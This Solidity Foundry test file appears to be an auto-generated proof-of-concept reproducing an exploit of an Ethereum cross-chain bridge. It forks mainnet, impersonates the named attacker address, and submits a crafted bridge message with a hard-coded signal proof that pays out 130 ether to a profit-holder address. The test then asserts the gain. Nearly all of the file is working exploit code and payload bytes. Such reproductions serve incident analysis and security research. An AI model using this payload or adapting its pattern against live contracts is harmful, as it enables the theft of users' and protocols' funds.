// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x7506dea0c38ca0b55364b22424374c5a1ae1b76a
// Attack Contract : 0xd60247c6848b7ca29eddf63aa924e53db6ddd8ec
// Vulnerable Contract : 0xd60247c6848b7ca29eddf63aa924e53db6ddd8ec
// Attack Tx : 0xb8befb015a67de8f40890b1f8667c597c3b66a52b388ec1c6cd28637fd65dd13
// Block : 25368908
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 223.26K USD
//
// @POC Author
// Generated PoC

//
// Unresolved gap: action_graph_validation marks the matched bridge/quota calls as product-readiness warnings because
// they were not emitted by the graph renderer. The typed selector, message fields, and proof bytes below come from the
// matched semantic call evidence; no protocol internals are invented here.

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 25368907;
    uint256 constant TX_TIMESTAMP = 1782080303;
    uint256 constant TX_BLOCK_NUMBER = 25368908;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));
        _logBalances("Before exploit");
        attack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function attack() internal {
        BridgeMessage memory message = BridgeMessage({
            sourceChainId: 0,
            destinationChainId: 0,
            gasLimit: 100000,
            sender: Addresses.SOURCE_BRIDGE,
            signalChainId: 167000,
            refundTo: ATTACKER_EOA,
            nonce: 1,
            gasPayer: ATTACKER_EOA,
            recipient: Addresses.PROFIT_HOLDER,
            value: 130 ether,
            message: hex""
        });
        IBridgeProcessor(ATTACK_CONTRACT).processMessage{value: TX_VALUE}(message, _signalProof());
    }

    function _signalProof() internal pure returns (bytes memory) {
        return hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000028c5800000000000000000000000000000000000000000000000000000000001b8f1404ee248905810cb11566831147867255e7c30271ead8be594e64cfd32f6d1d2a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000006cf86aa12090f15910d82ece448b46ec05af6ff9d4e82a89c2af768b20b69c1c68453a7ccdb846f8440180a00bfc7d2ba90e10292e2a95c662b4bd00c53c30d6d0a0054bd982e901fd2acdbda0bc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000053f8518080a0a0fcdfd79808e1bffd724863335a5d16a126a1d166e700d413f959727def245380808080808080808080a0a5b8d27d6829b06598fe82984ffec26c073d99adb3c385beba34d57527804efa808080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000053f851808080808080808080a08dbcfd04bd30b12d1e39e334dc09b13b29d7494a1793aabebeb198e4e66f69c98080a053a2c33077fd94b70ef5e04c49803aadd115680e10cfb7c1cdff456a5f359b9880808080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045f843a020919bb07301be4cd1b74727e21c09b02afcf097600b1c033022cffafe2de7a6a1a0855db45d77ae44a0a2ac4d2dad3fbf9fd4c341d923738c8356dbcd2f22482ef1000000000000000000000000000000000000000000000000000000";
    }

    function _expectProfitLegs(address attackContract, address attackChild) internal override {
        attackContract;
        attackChild;
        _expectProfit(Addresses.PROFIT_HOLDER, address(0), Addresses.ZERO, "ETH", 130 ether);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant SOURCE_BRIDGE = 0x1670000000000000000000000000000000000001;
    address internal constant ATTACKER_EOA = 0x7506DeA0c38ca0B55364B22424374c5A1ae1B76a;
    address internal constant PROFIT_HOLDER = 0xA98035081fB739EbE9C8f80904668fb11438a846;
    address internal constant ATTACK_CONTRACT = 0xd60247c6848B7Ca29eDdF63AA924E53dB6Ddd8EC;
}

struct BridgeMessage {
    uint64 sourceChainId;
    uint64 destinationChainId;
    uint32 gasLimit;
    address sender;
    uint64 signalChainId;
    address refundTo;
    uint64 nonce;
    address gasPayer;
    address recipient;
    uint256 value;
    bytes message;
}

interface IBridgeProcessor {
    function processMessage(BridgeMessage calldata bridgeMessage, bytes calldata signalProof) external payable;
}
